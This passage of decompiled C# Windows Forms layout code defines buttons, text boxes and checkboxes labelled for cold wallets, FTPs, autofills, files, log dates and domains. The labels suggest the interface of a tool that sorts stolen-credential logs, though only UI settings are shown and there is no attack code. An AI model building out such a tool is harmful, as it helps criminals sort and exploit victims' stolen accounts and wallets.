        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.m_ad).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.m_ad).Location = new System.Drawing.Point(1072, 557);
        ((System.Windows.Forms.Control)this.m_ad).Name = "saveAccountsDomain";
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.m_ad).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).StyleManager = null;
        ((System.Windows.Forms.Control)this.m_ad).TabIndex = 132;
        ((System.Windows.Forms.Control)this.m_ad).Text = "Sort";
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.m_ad).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.m_ad).Click += new System.EventHandler(ad_Click);
        ((GuiLib.AnimaTextBox)this.m_ae).Dark = false;
        ((System.Windows.Forms.Control)this.m_ae).Location = new System.Drawing.Point(507, 341);
        ((GuiLib.AnimaTextBox)this.m_ae).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.m_ae).MultiLine = true;
        ((System.Windows.Forms.Control)this.m_ae).Name = "saveAccountsDomainTb";
        ((GuiLib.AnimaTextBox)this.m_ae).Numeric = false;
        ((GuiLib.AnimaTextBox)this.m_ae).ReadOnly = false;
        ((System.Windows.Forms.Control)this.m_ae).Size = new System.Drawing.Size(640, 210);
        ((System.Windows.Forms.Control)this.m_ae).TabIndex = 131;
        ((GuiLib.AnimaTextBox)this.m_ae).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.m_af).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.m_af).Location = new System.Drawing.Point(627, 313);
        ((System.Windows.Forms.Control)this.m_af).Name = "saveAccountSorterStatusLbl";
        ((System.Windows.Forms.Control)this.m_af).Size = new System.Drawing.Size(114, 25);
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_af).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_af).StyleManager = null;
        ((System.Windows.Forms.Control)this.m_af).TabIndex = 130;
        ((System.Windows.Forms.Control)this.m_af).Text = "Waiting";
        ((System.Windows.Forms.Label)this.m_af).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_af).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_af).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.m_b0).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.m_b0).Location = new System.Drawing.Point(507, 313);
        ((System.Windows.Forms.Control)this.m_b0).Name = "metroSetLabel7";
        ((System.Windows.Forms.Control)this.m_b0).Size = new System.Drawing.Size(114, 25);
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b0).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b0).StyleManager = null;
        ((System.Windows.Forms.Control)this.m_b0).TabIndex = 129;
        ((System.Windows.Forms.Control)this.m_b0).Text = "Status of sorter:";
        ((System.Windows.Forms.Label)this.m_b0).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b0).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.m_b0).ThemeName = "MetroDark";
        ((GuiLib.AnimaTextBox)this.m_a9).Dark = false;
        ((System.Windows.Forms.Control)this.m_a9).Location = new System.Drawing.Point(135, 149);
        ((GuiLib.AnimaTextBox)this.m_a9).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.m_a9).MultiLine = false;
        ((System.Windows.Forms.Control)this.m_a9).Name = "singleSetCommentSortTb";
        ((GuiLib.AnimaTextBox)this.m_a9).Numeric = false;
        ((GuiLib.AnimaTextBox)this.m_a9).ReadOnly = false;
        ((System.Windows.Forms.Control)this.m_a9).Size = new System.Drawing.Size(265, 23);
        ((System.Windows.Forms.Control)this.m_a9).TabIndex = 128;
        ((GuiLib.AnimaTextBox)this.m_a9).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.m_aa).AutoSize = true;
        ((System.Windows.Forms.Control)this.m_aa).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.m_aa).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.m_aa).Location = new System.Drawing.Point(28, 151);
        ((System.Windows.Forms.Control)this.m_aa).Name = "label27";
        ((System.Windows.Forms.Control)this.m_aa).Size = new System.Drawing.Size(83, 15);
        ((System.Windows.Forms.Control)this.m_aa).TabIndex = 127;
        ((System.Windows.Forms.Control)this.m_aa).Text = "Set Comment:";
        ((GuiLib.AnimaTextBox)this.m_a7).Dark = false;
        ((System.Windows.Forms.Control)this.m_a7).Location = new System.Drawing.Point(135, 118);
        ((GuiLib.AnimaTextBox)this.m_a7).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.m_a7).MultiLine = false;
        ((System.Windows.Forms.Control)this.m_a7).Name = "singleSkipCommentSortTb";
        ((GuiLib.AnimaTextBox)this.m_a7).Numeric = false;
        ((GuiLib.AnimaTextBox)this.m_a7).ReadOnly = false;
        ((System.Windows.Forms.Control)this.m_a7).Size = new System.Drawing.Size(265, 23);
        ((System.Windows.Forms.Control)this.m_a7).TabIndex = 126;
        ((GuiLib.AnimaTextBox)this.m_a7).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.m_a8).AutoSize = true;
        ((System.Windows.Forms.Control)this.m_a8).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.m_a8).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.m_a8).Location = new System.Drawing.Point(28, 120);
        ((System.Windows.Forms.Control)this.m_a8).Name = "label26";
        ((System.Windows.Forms.Control)this.m_a8).Size = new System.Drawing.Size(89, 15);
        ((System.Windows.Forms.Control)this.m_a8).TabIndex = 125;
        ((System.Windows.Forms.Control)this.m_a8).Text = "Skip Comment:";
        ((System.Windows.Forms.Control)this.m_a1).AutoSize = true;
        ((System.Windows.Forms.Control)this.m_a1).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.m_a1).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.m_a1).Location = new System.Drawing.Point(28, 502);
        ((System.Windows.Forms.Control)this.m_a1).Name = "label21";
        ((System.Windows.Forms.Control)this.m_a1).Size = new System.Drawing.Size(71, 15);
        ((System.Windows.Forms.Control)this.m_a1).TabIndex = 122;
        ((System.Windows.Forms.Control)this.m_a1).Text = "LogDate To:";
        ((System.Windows.Forms.Control)this.m_a2).AutoSize = true;
        ((System.Windows.Forms.Control)this.m_a2).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.m_a2).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.m_a2).Location = new System.Drawing.Point(28, 474);
        ((System.Windows.Forms.Control)this.m_a2).Name = "label22";
        ((System.Windows.Forms.Control)this.m_a2).Size = new System.Drawing.Size(90, 15);
        ((System.Windows.Forms.Control)this.m_a2).TabIndex = 121;
        ((System.Windows.Forms.Control)this.m_a2).Text = "LogDate FROM:";
        ((System.Windows.Forms.Control)this.singleColdWalletSortCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleColdWalletSortCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleColdWalletSortCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleColdWalletSortCb).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleColdWalletSortCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleColdWalletSortCb).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.singleColdWalletSortCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleColdWalletSortCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.singleColdWalletSortCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.singleColdWalletSortCb).Location = new System.Drawing.Point(381, 398);
        ((System.Windows.Forms.Control)this.singleColdWalletSortCb).Name = "singleColdWalletSortCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleColdWalletSortCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.singleColdWalletSortCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleColdWalletSortCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleColdWalletSortCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.singleColdWalletSortCb).TabIndex = 120;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleColdWalletSortCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleColdWalletSortCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.label3).AutoSize = true;
        ((System.Windows.Forms.Control)this.label3).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label3).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label3).Location = new System.Drawing.Point(198, 398);
        ((System.Windows.Forms.Control)this.label3).Name = "label3";
        ((System.Windows.Forms.Control)this.label3).Size = new System.Drawing.Size(74, 15);
        ((System.Windows.Forms.Control)this.label3).TabIndex = 119;
        ((System.Windows.Forms.Control)this.label3).Text = "Cold wallets:";
        ((System.Windows.Forms.Control)this.currentDomainLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.currentDomainLbl).Location = new System.Drawing.Point(927, 7);
        ((System.Windows.Forms.Control)this.currentDomainLbl).Name = "currentDomainLbl";
        ((System.Windows.Forms.Control)this.currentDomainLbl).Size = new System.Drawing.Size(114, 25);
        ((MetroSet_UI.Controls.MetroSetLabel)this.currentDomainLbl).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.currentDomainLbl).StyleManager = null;
        ((System.Windows.Forms.Control)this.currentDomainLbl).TabIndex = 118;
        ((System.Windows.Forms.Control)this.currentDomainLbl).Text = "None";
        ((System.Windows.Forms.Label)this.currentDomainLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.currentDomainLbl).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.currentDomainLbl).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.metroSetLabel2).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.metroSetLabel2).Location = new System.Drawing.Point(807, 7);
        ((System.Windows.Forms.Control)this.metroSetLabel2).Name = "metroSetLabel2";
        ((System.Windows.Forms.Control)this.metroSetLabel2).Size = new System.Drawing.Size(114, 25);
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel2).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel2).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetLabel2).TabIndex = 117;
        ((System.Windows.Forms.Control)this.metroSetLabel2).Text = "Current domain:";
        ((System.Windows.Forms.Label)this.metroSetLabel2).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel2).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel2).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.sortDomain).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.sortDomain).Location = new System.Drawing.Point(1068, 255);
        ((System.Windows.Forms.Control)this.sortDomain).Name = "sortDomain";
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.sortDomain).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).StyleManager = null;
        ((System.Windows.Forms.Control)this.sortDomain).TabIndex = 116;
        ((System.Windows.Forms.Control)this.sortDomain).Text = "Sort";
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.sortDomain).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.sortDomain).Click += new System.EventHandler(sortDomain_Click);
        ((GuiLib.AnimaTextBox)this.domainsTb).Dark = false;
        ((System.Windows.Forms.Control)this.domainsTb).Location = new System.Drawing.Point(507, 35);
        ((GuiLib.AnimaTextBox)this.domainsTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.domainsTb).MultiLine = true;
        ((System.Windows.Forms.Control)this.domainsTb).Name = "domainsTb";
        ((GuiLib.AnimaTextBox)this.domainsTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.domainsTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.domainsTb).Size = new System.Drawing.Size(640, 210);
        ((System.Windows.Forms.Control)this.domainsTb).TabIndex = 115;
        ((GuiLib.AnimaTextBox)this.domainsTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.domainSorterLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.domainSorterLbl).Location = new System.Drawing.Point(627, 7);
        ((System.Windows.Forms.Control)this.domainSorterLbl).Name = "domainSorterLbl";
        ((System.Windows.Forms.Control)this.domainSorterLbl).Size = new System.Drawing.Size(114, 25);
        ((MetroSet_UI.Controls.MetroSetLabel)this.domainSorterLbl).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.domainSorterLbl).StyleManager = null;
        ((System.Windows.Forms.Control)this.domainSorterLbl).TabIndex = 114;
        ((System.Windows.Forms.Control)this.domainSorterLbl).Text = "Waiting";
        ((System.Windows.Forms.Label)this.domainSorterLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.domainSorterLbl).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.domainSorterLbl).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.metroSetLabel3).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.metroSetLabel3).Location = new System.Drawing.Point(507, 7);
        ((System.Windows.Forms.Control)this.metroSetLabel3).Name = "metroSetLabel3";
        ((System.Windows.Forms.Control)this.metroSetLabel3).Size = new System.Drawing.Size(114, 25);
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel3).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel3).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetLabel3).TabIndex = 113;
        ((System.Windows.Forms.Control)this.metroSetLabel3).Text = "Status of sorter:";
        ((System.Windows.Forms.Label)this.metroSetLabel3).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel3).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.metroSetLabel3).ThemeName = "MetroDark";
        ((GuiLib.AnimaTextBox)this.singleOsSortTb).Dark = false;
        ((System.Windows.Forms.Control)this.singleOsSortTb).Location = new System.Drawing.Point(135, 182);
        ((GuiLib.AnimaTextBox)this.singleOsSortTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.singleOsSortTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.singleOsSortTb).Name = "singleOsSortTb";
        ((GuiLib.AnimaTextBox)this.singleOsSortTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.singleOsSortTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.singleOsSortTb).Size = new System.Drawing.Size(265, 23);
        ((System.Windows.Forms.Control)this.singleOsSortTb).TabIndex = 112;
        ((GuiLib.AnimaTextBox)this.singleOsSortTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label17).AutoSize = true;
        ((System.Windows.Forms.Control)this.label17).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label17).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label17).Location = new System.Drawing.Point(28, 184);
        ((System.Windows.Forms.Control)this.label17).Name = "label17";
        ((System.Windows.Forms.Control)this.label17).Size = new System.Drawing.Size(25, 15);
        ((System.Windows.Forms.Control)this.label17).TabIndex = 111;
        ((System.Windows.Forms.Control)this.label17).Text = "OS:";
        ((System.Windows.Forms.Control)this.singleFilesSortCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFilesSortCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFilesSortCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFilesSortCb).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFilesSortCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFilesSortCb).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.singleFilesSortCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFilesSortCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.singleFilesSortCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.singleFilesSortCb).Location = new System.Drawing.Point(162, 397);
        ((System.Windows.Forms.Control)this.singleFilesSortCb).Name = "singleFilesSortCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFilesSortCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.singleFilesSortCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFilesSortCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFilesSortCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.singleFilesSortCb).TabIndex = 110;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFilesSortCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFilesSortCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.label16).AutoSize = true;
        ((System.Windows.Forms.Control)this.label16).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label16).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label16).Location = new System.Drawing.Point(28, 397);
        ((System.Windows.Forms.Control)this.label16).Name = "label16";
        ((System.Windows.Forms.Control)this.label16).Size = new System.Drawing.Size(33, 15);
        ((System.Windows.Forms.Control)this.label16).TabIndex = 109;
        ((System.Windows.Forms.Control)this.label16).Text = "Files:";
        ((System.Windows.Forms.Control)this.singleFtpsSortCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFtpsSortCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFtpsSortCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFtpsSortCb).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFtpsSortCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFtpsSortCb).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.singleFtpsSortCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFtpsSortCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.singleFtpsSortCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.singleFtpsSortCb).Location = new System.Drawing.Point(381, 374);
        ((System.Windows.Forms.Control)this.singleFtpsSortCb).Name = "singleFtpsSortCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFtpsSortCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.singleFtpsSortCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFtpsSortCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFtpsSortCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.singleFtpsSortCb).TabIndex = 108;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFtpsSortCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleFtpsSortCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.label15).AutoSize = true;
        ((System.Windows.Forms.Control)this.label15).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label15).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label15).Location = new System.Drawing.Point(198, 374);
        ((System.Windows.Forms.Control)this.label15).Name = "label15";
        ((System.Windows.Forms.Control)this.label15).Size = new System.Drawing.Size(35, 15);
        ((System.Windows.Forms.Control)this.label15).TabIndex = 107;
        ((System.Windows.Forms.Control)this.label15).Text = "FTPs:";
        ((System.Windows.Forms.Control)this.singleAfSortCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleAfSortCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleAfSortCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleAfSortCb).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleAfSortCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleAfSortCb).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.singleAfSortCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleAfSortCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.singleAfSortCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.singleAfSortCb).Location = new System.Drawing.Point(162, 374);
        ((System.Windows.Forms.Control)this.singleAfSortCb).Name = "singleAfSortCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleAfSortCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.singleAfSortCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleAfSortCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleAfSortCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.singleAfSortCb).TabIndex = 106;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleAfSortCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.singleAfSortCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.label14).AutoSize = true;
        ((System.Windows.Forms.Control)this.label14).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label14).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label14).Location = new System.Drawing.Point(28, 374);
        ((System.Windows.Forms.Control)this.label14).Name = "label14";
        ((System.Windows.Forms.Control)this.label14).Size = new System.Drawing.Size(54, 15);
        ((System.Windows.Forms.Control)this.label14).TabIndex = 105;
        ((System.Windows.Forms.Control)this.label14).Text = "Autofills:";
